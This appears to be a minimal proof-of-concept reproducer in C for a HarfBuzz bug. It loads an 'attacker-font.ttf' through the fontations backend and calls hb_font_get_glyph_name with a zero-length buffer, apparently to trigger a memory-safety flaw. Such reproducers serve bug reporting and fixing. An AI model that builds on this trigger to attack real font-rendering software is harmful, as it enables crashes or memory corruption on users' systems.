#include <hb.h>

int main(void) {
    hb_blob_t *blob = hb_blob_create_from_file("attacker-font.ttf");
    hb_face_t *face = hb_face_create(blob, 0);
    hb_font_t *font = hb_font_create(face);
    hb_fontations_font_set_funcs(font); /* requires -Dfontations=enabled */

    char buf[1];
    hb_font_get_glyph_name(font, 0, buf, 0); 
    return 0;
}
